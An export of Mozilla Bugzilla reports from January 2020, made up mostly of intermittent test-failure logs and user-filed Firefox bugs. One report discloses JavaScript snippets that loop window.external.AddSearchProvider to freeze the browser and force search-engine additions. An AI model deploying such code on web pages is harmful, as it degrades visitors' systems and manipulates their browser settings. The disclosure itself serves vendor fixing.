2020-01-21T23:30:25.997Z] 23:30:25 INFO - 4 CPUs [task 2020-01-21T23:30:25.997Z] 23:30:25 INFO - [task 2020-01-21T23:30:25.997Z] 23:30:25 INFO - GPU: UNKNOWN [task 2020-01-21T23:30:25.997Z] 23:30:25 INFO - [task 2020-01-21T23:30:25
1610709,"Intermittent browser/components/newtab/test/browser/browser_highlights_section.js | Uncaught exception - Should render activity stream content - threw exception: [Exception... ""(null)"" nsresult: ""0x8000ffff (NS_ERROR_UNEXPECTED)""",RESOLVED,P5,WORKSFORME,"**Filed by:** nerli [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=285864528&repo=mozilla-beta **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/XQg-tjp3QxSQLQfXX24KgQ/runs/0/artifacts/public/logs/live_backing.log --- [task 2020-01-22T00:14:17.071Z] 00:14:17 INFO - TEST-START | browser/components/newtab/test/browser/browser_highlights_section.js [task 2020-01-22T00:14:20.790Z] 00:14:20 INFO - GECKO(10252) | JavaScript error: chrome://mochitests/content/browser/browser/components/newtab/test/browser/head.js, line 186: TypeError: content.document.getElementById(...) is null [task 2020-01-22T00:14:20.790Z] 00:14:20 INFO - TEST-INFO | started process screenshot [task 2020-01-22T00:14:20.848Z] 00:14:20 INFO - TEST-INFO | screenshot: exit 0 [task 2020-01-22T00:14:20.848Z] 00:14:20 INFO - Buffered messages logged at 00:14:17 [task 2020-01-22T00:14:20.849Z] 00:14:20 INFO - Entering test bound check_highlights_cards [task 2020-01-22T00:14:20.849Z] 00:14:20 INFO - Buffered messages finished [task 2020-01-22T00:14:20.849Z] 00:14:20 INFO - TEST-UNEXPECTED-FAIL | browser/components/newtab/test/browser/browser_highlights_section.js"
1610710,High frequency browser/base/content/test/general/browser_bug767836_perwindowpb.js | A promise chain failed to handle a rejection: (Unable to convert rejection reason to string.) - stack: (No stack available.),RESOLVED,P5,FIXED,"**Filed by:** nerli [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=285857028&repo=mozilla-beta **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/GQkA_DR3RTCOTHONhU_TxQ/runs/0/artifacts/public/logs/live_backing.log --- [task 2020-01-21T23:23:12.326Z] 23:23:12 INFO - TEST-START | browser/base/content/test/general/browser_bug767836_perwindowpb.js [task 2020-01-21T23:23:13.114Z] 23:23:13 INFO - GECKO(1908) | JavaScript error: resource://gre/modules/XULStore.jsm, line 66: Error: Can't find profile directory. [task 2020-01-21T23:23:13.231Z] 23:23:13 INFO - GECKO(1908) | JavaScript error: resource://gre/modules/XULStore.jsm, line 66: Error: Can't find profile directory. [task 2020-01-21T23:23:13.476Z] 23:23:13 INFO - GECKO(1908) | JavaScript error: , line 0: uncaught exception: undefined [task 2020-01-21T23:23:13.476Z] 23:23:13 INFO - TEST-INFO | started process screentopng [task 2020-01-21T23:23:13.890Z] 23:23:13 INFO - TEST-INFO | screentopng: exit 0 [task 2020-01-21T23:23:13.890Z] 23:23:13 INFO - Buffered messages logged at 23:23:12 [task 2020-01-21T23:23:13.890Z] 23:23:13 INFO - Entering test bound test_newTabService [ta"
1610758,TPS no longer works as its extension appears to not load.,RESOLVED,--,FIXED,"*Steps* We are launching our sync integration tests as defined here: https://github.com/mozilla-mobile/fenix/blob/master/docs/syncIntegrationTests.md An stage FxA account is created, then Nightly is launched and the sign in should happen and success *Actual* Nightly is launched, the FxA account is correctly created but the sign in never happens. These are the only logs generated: ``` 1579524367852 addons.webextension.doh-rollout@mozilla.org WARN Loading extension 'doh-rollout@mozilla.org': Reading manifest: Invalid extension permission: networkStatus 1579524367868 addons.webextension.screenshots@mozilla.org WARN Loading extension 'screenshots@mozilla.org': Reading manifest: Invalid extension permission: mozillaAddons 1579524367868 addons.webextension.screenshots@mozilla.org WARN Loading extension 'screenshots@mozilla.org': Reading manifest: Invalid extension permission: telemetry 1579524367868 addons.webextension.screenshots@mozilla.org WARN Loading extension 'screenshots@mozilla.org': Reading manifest: Invalid extension permission: resource://pdf.js/ 1579524367868 addons.webextension.screenshots@mozilla.org WARN Loading extension 'screenshots@mozilla.org': Reading manifest: Invali"
1610760,Navigating to https://delivery-console.stage.mozaws.net/ results in a 502 error in web console,VERIFIED,--,FIXED,**[Affected versions]:** - All Firefox versions **[Affected Platforms]:** - All Windows - All Mac - All Linux **[Prerequisites]:** - Have access to delivery console stage server. **[Steps to reproduce]:** 1. Open the browser. 2. Open the “web console” (F12) and select “Network” tab. 3. Navigate to https://delivery-console.stage.mozaws.net/. 4. Observe v3 network call in web console. **[Expected result]:** - The network call is returning 200. **[Actual result]:** - The network call is returning 502. **[Notes]:** - There are also some 403 network errors that might be resulted by the 502 error.
1610764,mouse click on tab causes tab to move to a new window,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: left mouse click on a tab ""a little bit inaccurately"" or fast Actual results: tab moves to a new window. It happens too often, to be an accident. I think it is related to 754693 Expected results: it shouldn't"
1610786,Intermittent toolkit/components/thumbnails/test/browser_thumbnails_bug726727.js | Test timed out -,RESOLVED,P5,INCOMPLETE,**Filed by:** opoprus [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=285938552&repo=autoland **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/eqbijTVgRDqNNuXHIxTDZQ/runs/0/artifacts/public/logs/live_backing.log --- [task 2020-01-22T11:20:30.381Z] 11:20:30 INFO - TEST-START | toolkit/components/thumbnails/test/browser_thumbnails_bug726727.js [task 2020-01-22T11:20:42.809Z] 11:20:42 INFO - GECKO(2624) | 2020-01-22 11:20:42.782 firefox[2624:30994] Persistent UI failed to open file file:///Users/cltbld/Library/Saved%20Application%20State/org.mozilla.nightly.savedState/window_1.data: No such file or directory (2) [task 2020-01-22T11:21:15.474Z] 11:21:15 INFO - TEST-INFO | started process screencapture [task 2020-01-22T11:21:15.621Z] 11:21:15 INFO - TEST-INFO | screencapture: exit 0 [task 2020-01-22T11:21:15.621Z] 11:21:15 INFO - Buffered messages logged at 11:20:30 [task 2020-01-22T11:21:15.622Z] 11:21:15 INFO - Entering test bound thumbnails_bg_bug726727 [task 2020-01-22T11:21:15.622Z] 11:21:15 INFO - Buffered messages finished [task 2020-01-22T11:21:15.622Z] 11:21:15 INFO - TEST-UNEXPECTED-FAIL | toolkit/components/thum
1610812,Context menu is displayed wrong (on the right side) for the last Highlight from a row again,RESOLVED,P3,DUPLICATE,"**Affected versions** * 73.0b8, 74.0a1 (2020-01-21) **Affected platforms** * Windows 10, macOS 10.13, Ubuntu 18.04; **Steps to reproduce** 1. Navigate to this link https://getpocket.cdn.mozilla.net/explore/trending?src=ff_new_tab and open ~25-30 different pages each in a new tab, in order to populate the Highlights section. 2. Restart the browser. 3. Click the ""..."" button for one of the Highlights on the last tile from a row. **Expected result** * context menu is opened on the left side; **Actual result** * context menu is opened on the right side, forcing the scrollbar to appear; **Regression range** * last good build_date: 2019-12-18; * first bad build_date: 2019-12-19; * pushlog [URL](https://hg.mozilla.org/mozilla-central/pushloghtml?fromchange=f870bccd07eeedcde5f5e0ee290d6b2158934105&tochange=8e1b11b00157269f1f781753efc241e005efeaf1) **Additional notes** * 72.0.2 not affected; * issue surfaced before as bug 1485633; * best way to reproduce this is resizing the window to ~ half width of the screen."
1610865,"""1/2.3 B"" in urlbar shouldn't suggest ""Visit http://0.0.0.1/2.3 B""",RESOLVED,P3,DUPLICATE,"Can ""1/2.3 B"" be a valid URL? I think that typing/pasting it in urlbar and pressing enter should load results in default search engine instead of trying to load http://0.0.0.1/2.3 B as Firefox currently does."
1610871,"Intermittent browser/components/aboutlogins/tests/browser/browser_sessionRestore.js | Uncaught exception - [Exception... ""(null)"" nsresult: ""0x80040111 (NS_ERROR_NOT_AVAILABLE)"" location: ""<unknown>"" data: no]",RESOLVED,P5,INCOMPLETE,**Filed by:** nbeleuzu [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=285972660&repo=autoland **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/GbrPZYN7TyuDh3TBPmCotg/runs/0/artifacts/public/logs/live_backing.log --- [task 2020-01-22T14:59:20.567Z] 14:59:20 INFO - TEST-START | browser/components/aboutlogins/tests/browser/browser_sessionRestore.js [task 2020-01-22T14:59:21.584Z] 14:59:21 INFO - TEST-INFO | started process screenshot [task 2020-01-22T14:59:21.809Z] 14:59:21 INFO - TEST-INFO | screenshot: exit 0 [task 2020-01-22T14:59:21.809Z] 14:59:21 INFO - Buffered messages logged at 14:59:20 [task 2020-01-22T14:59:21.810Z] 14:59:21 INFO - Entering test bound setup [task 2020-01-22T14:59:21.810Z] 14:59:21 INFO - Leaving test bound setup [task 2020-01-22T14:59:21.811Z] 14:59:21 INFO - Entering test bound [task 2020-01-22T14:59:21.811Z] 14:59:21 INFO - Buffered messages logged at 14:59:21 [task 2020-01-22T14:59:21.811Z] 14:59:21 INFO - TEST-PASS | browser/components/aboutlogins/tests/browser/browser_sessionRestore.js | Confirming that login is displayed in page - true == true - [task 2020-01-22T14:59:21.811Z] 14:59:21 I
1610908,Intermittent browser/components/customizableui/test/browser_947914_button_addons.js (finished) | application crashed [@ objc_msgSend + 0x1d],RESOLVED,--,DUPLICATE,**Filed by:** aciure [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=285998020&repo=autoland **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/DBsPWS2yQvmghFLbnWLJ3Q/runs/0/artifacts/public/logs/live_backing.log --- [task 2020-01-22T18:39:34.260Z] 18:39:34 INFO - mozcrash Downloading symbols from: https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/DYLfOWxqQHSPDAWcgAFi8Q/artifacts/public/build/target.crashreporter-symbols.zip [task 2020-01-22T18:39:39.975Z] 18:39:39 INFO - mozcrash Copy/paste: /Users/cltbld/tasks/task_1579717595/build/macosx64-minidump_stackwalk /var/folders/00/5fqjdq0d1tq3292h10_krdp8000017/T/tmpIJMJWk.mozrunner/minidumps/EF2C6C2B-BF1A-4FA5-BF1C-06CDFC206649.dmp /var/folders/00/5fqjdq0d1tq3292h10_krdp8000017/T/tmpzzBuUv [task 2020-01-22T18:39:46.166Z] 18:39:46 INFO - mozcrash Saved minidump as /Users/cltbld/tasks/task_1579717595/build/blobber_upload_dir/EF2C6C2B-BF1A-4FA5-BF1C-06CDFC206649.dmp [task 2020-01-22T18:39:46.167Z] 18:39:46 INFO - mozcrash Saved app info as /Users/cltbld/tasks/task_1579717595/build/blobber_upload_dir/EF2C6C2B-BF1A-4FA5-BF1C-06CDFC206649.extra [task 2020-01-22T18:39:
1610923,Point npm run testmc to use mach to avoid error with linting,RESOLVED,P1,FIXED,"From inside /browser/components/newtab If you try to run `npm run testmc` You get and error: ``` Error: Cannot read config file: /home/scott/mozilla-central/.eslintrc.js Error: ENOENT: no such file or directory, open 'tools/rewriting/ThirdPartyPaths.txt' at Object.openSync (fs.js:443:3) at Object.readFileSync (fs.js:343:35) at Object.<anonymous> (/home/scott/mozilla-central/.eslintrc.js:37:9) at Module._compile (/home/scott/mozilla-central/browser/components/newtab/node_modules/v8-compile-cache/v8-compile-cache.js:192:30) at Object.Module._extensions..js (internal/modules/cjs/loader.js:787:10) at Module.load (internal/modules/cjs/loader.js:653:32) at tryModuleLoad (internal/modules/cjs/loader.js:593:12) at Function.Module._load (internal/modules/cjs/loader.js:585:3) at Module.require (internal/modules/cjs/loader.js:690:17) at require (/home/scott/mozilla-central/browser/components/newtab/node_modules/v8-compile-cache/v8-compile-cache.js:161:20) Failed to parse JSON: Unexpected end of JSON input ``` I ran a bisect and found https://bugzilla.mozilla.org/show_bug.cgi?id=1607172 to be the first instance of this issue."
1610926,"When right clicking on an image, the contextual menu is missing text",RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: On any website, I right click on an image to view the contextual menu Actual results: The text appears to be missing except for addons (1password and google translate) Expected results: I should have seen all contextual menu items (such as download, open in new tab, etc)"
1610932,Address bar stays in focus after clicking bookmark folder in bookmark toolbar,RESOLVED,P2,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0 Steps to reproduce: Have bookmarks toolbar visible under view > toolbars, and have a bookmark folder visible in the bookmark toolbar, such that it is not directly below the address bar Click within the URL area of the address bar Click on the bookmark folder in the bookmark toolbar. Also happens when you click the ""more"" dropdown button at the far right of the bookmark toolbar. 74.0a1 (2020-01-22) (64-bit) Actual results: The ""popout"" frame remains around the address bar, partially obstructing the bookmarks toolbar (see attached screenshot) Expected results: The address bar should return to its ""out of focus"" state as it would have been before clicking on the URL in the steps above."
1610985,Hide the Microsoft Edge Legacy migrator when the browser isn't accessible to users,NEW,P2,,"(Quoting Matthew N. [:MattN] from bug 1608513 comment #4) > There's not an easy way to support all the possible configurations (Legacy Edge, side-by-side [SxS], and new Edge) on all Windows versions we support. I think the simplest path is to rename the legacy migrator to ""Microsoft Edge Legacy"" on all Windows versions. This may cause some confusion for users who are still migrating from it and don't have the Chromium Edge but I'm not sure addressing that is worth the complexity/time. > > One thing that probably wouldn't be hard to implement would be hiding the legacy migrator when the application is hidden from the user. Unfortunately the registry key mentioned at https://docs.microsoft.com/en-us/deployedge/microsoft-edge-sysupdate-access-old-edge#how-operating-system-os-changes-are-triggered (`SOFTWARE\Microsoft\EdgeUpdate\ClientState\{56EB18F8-B008-4CBD-B6D2-8C97FE7E9062}\BrowserReplacement`) doesn't exactly match the one set on my Windows 10 VM (`HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\EdgeUpdate\ClientState\{56EB18F8-B008-4CBD-B6D2-8C97FE7E9062}\BrowserReplacement`) so I think we should ask Microsoft how best to detect when Microsoft Edge Legacy should be hidden. Mik"
1610992,"In new-tab sponsors/privacy modal popup, the ""Learn how privacy works on the new tab"" link has a wider-than-expected click area",VERIFIED,--,FIXED,"STR: 1. In a new tab, hover some sponsored tile and click its menu, and choose ""Our sponsors and your privacy"". 2. Hover the area to the right of the two links in the modal popup. ACTUAL RESULTS: - The blank space to the right of the ""Learn how privacy works on the new tab"" link is mysteriously linkified (that blank space is part of the link's hover-target). - ...vs. the blank space next to the other link is *not* linkified. - This inconsistency seems broken (and the linkified blank space feels especially broken). EXPECTED RESULTS: - The click target for the ""Learn how privacy works on the new tab"" link should not extend beyond the text itself. I'm tentatively marking this as confidential since this is part of the feature in bug 1602140 which is also marked as confidential (though the feature has shipped in Nightly, so I'm not sure this needs to be confidential)."
1611058,Rethink how send-tab falls back to the sync-based sendtab mechanism,RESOLVED,P3,FIXED,"If there's some intermittent server error sending a tab to Fenix, we fall back to the old sync command based mechanism - however, Fenix doesn't support this mechanism. Things like our VR products are probably in the same bucket. It's probably time to consider if we should kill that fallback."
1611064,Pinned tabs are lost when window without them is closed last,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: 1. i start my Laptop and then open the firefox then it is showing all the pinned tab that i have pinned. 2. after that i open another firefox window. that does not have pinned tab. 3. i close the first open browser then after the second one. 4. and start another firefox window, now it is not showing the pinned tabs. Actual results: It doesn't show the pinned tabs. Expected results: It should show the pinned tabs."
1611065,extension-storage fails checking if the fxa session is active,RESOLVED,--,FIXED,"Not sure how this was missed, but I just saw the traceback below. We should be using `.checkAccountStatus()` I can only assume this is a regression from a refactor done a few months ago :( ```1579755297762 Sync.ErrorHandler DEBUG extension-storage failed: TypeError: this._fxaService.sessionStatus is not a function(resource://gre/modules/ExtensionStorageSync.jsm:1199:55) JS Stack trace: _syncKeyRing@ExtensionStorageSync.jsm:1199:55 async*checkSyncKeyRing@ExtensionStorageSync.jsm:1096:18 async*syncAll@ExtensionStorageSync.jsm:812:16 async*_sync@extension-storage.js:44:33 WrappedNotify@util.js:210:32 sync@engines.js:914:55 _syncEngine@enginesync.js:242:20 sync@enginesync.js:176:24 ... ```"
1611066,PDF open endlessly tab,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: 1) Setup default pdf application as ""firefox"" (Apllication/Firefox) 2) Open file from the attachment or download it from official Acronis site https://bit.ly/37ovszu Windows 10 x64 1909, Firefox x64 72.0.2 On new profile isuue is the same Actual results: Firefox endlessly opens new empty tab trying to open this file Expected results: Firefox opens new tab one time with this file"
1611069,draw google map bad when windows size is changed,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0 Steps to reproduce: 1. goto google map 2. resize window size to shrink or to expand Actual results: map is drawn with illegal image. Expected results: not change to xx times, only expand drawing area."
1611077,Nightly Build 74.0a1 (2020-01-22) (64-Bit) broken - don't open tabs or follow any link,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 Steps to reproduce: Windows 10 - Download latest Nightly Build 74.0a1 (2020-01-22) (64-Bit) - Start it, and see nothing - see only browserwindow with favorites and the address bar - but no pages, or new tabs open Actual results: - Nighly build not usable - not possible to close the browser without taskmanager Expected results: Open Tabs or links should work as expected"
1611086,Show all bookmarks not displayed when bookmarks list is long,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: 1. Click bookmarks icon from toolbar 2. Click bookmarks Actual results: With a lot of bookmarks a long list of bookmarks are displayed, but the button ""Show all bookmarks Ctrl + Shift + B"" is indiscernible. Expected results: The button should be displayed in full"
1611093,"Proxy credentials show the ""Discard"" dialog for saving changes",VERIFIED,P1,FIXED,"**Affected versions** Nightly 74.0a1 74.0a1 (2020-01-21) (64-bit) Beta 73.0b8 (64-bit) Release 72.0.2 (64-bit) **Affected platforms** Windows 10 x64 MacOS 10.15 **Steps to reproduce** 1. Launch Firefox 2. Set up manual Proxy configuration 3. Go to a site on the same tab to toggle the auth dialog 4. Enter valid credentials and save them 5. Go to about:logins 6. Edit the password and click on ""Save Changes"" **Expected result** The changes should be saved **Actual Result** The ""Discard unsaved changes"" dialog appears. Clicking ""Discard"" will discard the changes Clicking ""Cancel"" will **save** the changes *This only happens to Proxy credentials, http, ftp and other credentials don't have this issue* **Note** Last good build was 71.0a1 (2019-09-17) **Regression-Range** Mozregression found Bug 1579184."
1611116,Can't open .msg files from Firefox in Outlook 365,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 Steps to reproduce: Open any .MSG file with outlook directly from Firefox. Actual results: Give out an error. Expected results: .MSG file should open in outlook."
1611123,"""Restore old session"" is opening old and unwanted tabs, even when I've deliberately closed them.",RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36 OPR/66.0.3515.27 Steps to reproduce: This is a fresh install of an operating system I have previously had no issues with. The only thing I did was create a new user profile, and changed one setting that allowed me to load userChrome.css files. Loaded in a CSS theme, and checked the ""restore old session"" button. Actual results: My settings are set to restore old sessions, but FF will persistently open these tabs that I have already closed and will only do it with some tabs. I don't know whats causing it, but the same three video tabs keep coming up even thogh I have watched the video and closed the tab (with keyboard shortcuts and mouse) Nothing. They just keep coming back. Mind you, this is on a fresh install of an operating system I have used before. No idea what's causing this. Expected results: The tabs that are closed should NEVER reopen upon opening a new window."
1611161,Format numbers in the font size drop-down using mozIntl.NumberFormat,NEW,P3,,#### Affected versions: ALL #### Affected platforms: ALL #### Preconditions: Install an AR build. #### Steps: 1. Launch Firefox with a new profile using the AR build and go to about:preferences. 2. Scroll down to Language and Appearance section. #### Actual result: Font size drop-down displays western numerals. Default zoom drop-down displays eastern arabic numerals I think. #### Expected result: All drop-downs should display the numbers in the same format.
1611179,Firefox Home - First Highlights tile does not immediately reflect correct bookmark name,NEW,P3,,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: 1. Download the latest FF nightly. (No existing user data or bookmarks.) 2. Visit Wikipedia.org or any other site. 3. Bookmark the page via the star icon in the address bar. Give the bookmark a new name other than the title of the page, such as ""WikipediaCustomName"". 4. Navigate to Firefox Home via the home button and scroll to the Highlights section. Actual results: The name on the first Highlights tile is the default name, not the new name (e.g. ""Wikipedia"", not ""WikipediaCustomName""). This only affects the first tile. Repeating the process with another website moves the first bookmark (Wikipedia) to a second tile, and that name updates to the correct name. However, the new first tile will have an incorrect name. Refreshing the page has no effect. However, on restarting Firefox, the first tile's name updates to the correct name. I'm not sure how this issue relates to ""non-bookmark"" Highlights tiles such as those for frequently visited sites. Expected results: As for all such tiles, the name on the first Highlights bookmark tile should always be the current bookmark name,"
1611215,Length of items in address bar changes when I hit CMD for no clear reason,NEW,P3,,See video. I find this behaviour distracting every time I notice it!
1611224,bindgen - clang error undeclared identifier '__builtin_isnanf(l)' when building with gcc,RESOLVED,--,INVALID,User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: I see this on Solaris with gcc build (clang doesn't work for me) after integration of: Bug 1560664 - default to C++17 with optional gnu extensions; r=rstewart ``` 22:15.00 error: failed to run custom build command for `style v0.0.1 (/scratch/FIREFOX/servo/components/style)` 22:15.00 Caused by: 22:15.00 process didn't exit successfully: `/scratch/FIREFOX/obj-x86_64-pc-solaris2.11/debug/build/style-b3369fd9f69dd0ab/build-script-build` (exit code: 101) 22:15.00 --- stdout 22:15.00 cargo:rerun-if-changed=build.rs .. 22:15.06 --- stderr .. 22:15.09 /usr/gcc/9/lib/gcc/x86_64-pc-solaris2.11/9.2.0/../../../../include/c++/9.2.0/tr1/special_function_util.h:126:14: error: use of undeclared identifier '__builtin_isnanf' 22:15.09 /usr/gcc/9/lib/gcc/x86_64-pc-solaris2.11/9.2.0/../../../../include/c++/9.2.0/tr1/special_function_util.h:130:14: error: use of undeclared identifier '__builtin_isnanl' ``` Problem seems to be that clang doesn't have ```__builtin_isnanf``` and ```__builtin_isnanl``` where gcc does. Seems that gcc internal headers gets into clang. Clang seems to be called like t
1611271,macOS Urlbar border is hard to make out,VERIFIED,P1,FIXED,"Bug 1606930 comment 6 points out that our macOS Urlbar border is not the right colour. This is because we're using `-moz-mac-focusring` for the colour, which is transparent. This doesn't look good with the new 1px border, especially on dark theme."
1611276,Malicious use of AddSearchProvider method,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 Edg/79.0.309.71 Steps to reproduce: The DOM method window.external.AddSearchProvider() can be used in various malicious way to prevent Firefox from responding or forcing a user to add (malicious) search engines to Firefox. I found it in the wild and could easy replicate it with some javascript. Here are some examples of malicious use of the method. It uses the OpenSearch XML from the Firefox Addon website as example. Example 1 ---------------- while(true) { window.external.AddSearchProvider('https://addons.mozilla.org/nl/firefox/opensearch.xml'); } ---------------- Examples 2 ---------------- setInterval(function() { window.external.AddSearchProvider('https://addons.mozilla.org/nl/firefox/opensearch.xml'); }, 10); ---------------- Tested on system with Firefox version 72.0.2 / Windows 10 Pro 1909 / Intel Core i5-7200U / 8 GB RAM. Actual results: Example 1 ---------------- On a clean Firefox profile, CPU usage rises to 80% and system RAM goes up to 95%, slowing down the users system and rendering Firefox unresponsive. On my personal profile, which is quite "
1611285,tab contents lost after a forced (upgrade) restart,RESOLVED,--,DUPLICATE,"After upgrading Firefox, it works normally for some time then starts displaying ""one small thing, we need to restart"" in every new tab. That's its usual behaviour. The ""one small thing"" message happens for not just genuinely new tabs, but also for tabs that had been for some reason unloaded (like, have not been switched to since session restore, been evicted due to low memory, etc). And if ""one small thing"" is shown, then after restart, the tab's contents is gone. Its caption shows ""New Tab"", there's no back button enabled, it's not in history, etc. I found no way to recover it other than restoring the profile from last backup (fortunately, I snapshot /home hourly thanks to btrfs). A tab that's unloaded but haven't been switched to between Firefox discovers it wants to restart and the actual restart is restored normally."
1611308,Some context menu items that modify values should be disabled for disabled form controls,NEW,P3,,The following menu items (which isn't an exhaustive list) should IMO be disabled on disabled form fields e.g. <input>: * Cut * Paste * Fill Login/Password * Use generated password… * Spelling suggestions Perhaps [`onEditable`](https://searchfox.org/mozilla-central/rev/e878e5b81bb319c141900ce9cfcde732df5c8449/browser/actors/ContextMenuChild.jsm#1046) should be false for `@disabled` fields like it is for `@readOnly`… but then that makes me think perhaps `SpellCheckHelper.EDITABLE` should also be `false` in this case… Perhaps the spell checker underline should also be removed in this case?
1611311,Latest revision does not allow printing to pdf creator. It stops responding,RESOLVED,--,WORKSFORME,User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Tried printing to PDF Creator with Firefox with latest Firefox version 72.0.1. Actual results: Firefox stopped responding. Expected results: It should have opened a window asking for the location to save the created PDF file. I tried printing to PDF Creator from other applications and it works fine. I removed and re-installed PDF Creator with the same results.
1611336,"When using dark mode and bringing up the right click menu, the menu is dark as well, and hard to read and use.",RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Right click anywhere and use dark mode Actual results: The menu the right click brings up has messed up colors (some buttons are light, some are too dark, with dark text) Expected results: Light text on a uniformly dark menu"
1611395,Start page/address bar search does not accept foreign coding,RESOLVED,P5,WORKSFORME,User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Firefox starting search page and address bar (set to default) does not process special chars/letters for language selected in Mozilla. In this example Polish Language. All special letters existing in Polish are not interpreted correctly when typed in and searched. Default browser search set to https://duckduckgo.com in this example. Actual results: I search for polish wording 'Piękne łąki' (trans. beautiful fields) from the address bar or Mozilla starting search page and then duckduckgo page opens automatically and shows search results for 'Pi&#281;kne &#322;&#261;ki'. All special letters have been changed to ASCI number I believe. Expected results: The exact wording as typed should be sent to the website in this example 'Piękne łąki'.
1611409,Show the full permission prompt for notifications (e.g. after user click),RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.4 Safari/605.1.15 Steps to reproduce: 1. A website asks permission for push notifications (e.g. after a click on a button) 2. Firefox display only a small badge icon near the lock in the address bar and returns ""blocked"" automatically Actual results: The users don't see that small badge icon... That is really confusing when the user explicitly clicked a subscribe button on the website that should display the notifications prompt. The user clicks a subscribe button and then the status blocked is automatically returned to the website: this doesn't make sense and breaks most subscription flows. It also breaks all the double opt.-in workflows, that are recommended by Google usability guides. Try to subscribe to notifications here for example: 1. Visit https://pushpad.xyz/ 2. Click Allow on the custom prompt 3. You would expect to get a browser permission prompt, but instead ""blocked"" is returned immediately to the website 4. The user doesn't even notice the small badge icon 5. Even if the user notices the notification icon and allows notifications, he would have to click Al"
1611438,Intermittent toolkit/components/thumbnails/test/browser_thumbnails_bg_crash_during_capture.js | We should have recovered and completed the 2nd capture after the crash -,RESOLVED,P5,DUPLICATE,"**Filed by:** nerli [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=286343400&repo=autoland **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/DVObatkMRuOd5ZZVhAH3XQ/runs/0/artifacts/public/logs/live_backing.log --- [task 2020-01-24T13:56:15.563Z] 13:56:15 INFO - TEST-START | toolkit/components/thumbnails/test/browser_thumbnails_bg_crash_during_capture.js [task 2020-01-24T13:56:15.645Z] 13:56:15 INFO - GECKO(2454) | Et tu, Brute? [task 2020-01-24T13:56:16.011Z] 13:56:16 INFO - GECKO(2454) | [Parent 2454, Gecko_IOThread] WARNING: pipe error: Bad file descriptor: file /builds/worker/workspace/build/src/ipc/chromium/src/chrome/common/ipc_channel_posix.cc, line 733 [task 2020-01-24T13:56:16.145Z] 13:56:16 INFO - GECKO(2454) | Crash cleaned up [task 2020-01-24T13:56:21.036Z] 13:56:21 INFO - TEST-INFO | started process screencapture [task 2020-01-24T13:56:21.245Z] 13:56:21 INFO - TEST-INFO | screencapture: exit 0 [task 2020-01-24T13:56:21.247Z] 13:56:21 INFO - Buffered messages logged at 13:56:15 [task 2020-01-24T13:56:21.248Z] 13:56:21 INFO - Entering test bound thumbnails_bg_crash_during_capture [task 2020-01-24T13:56:21.24"
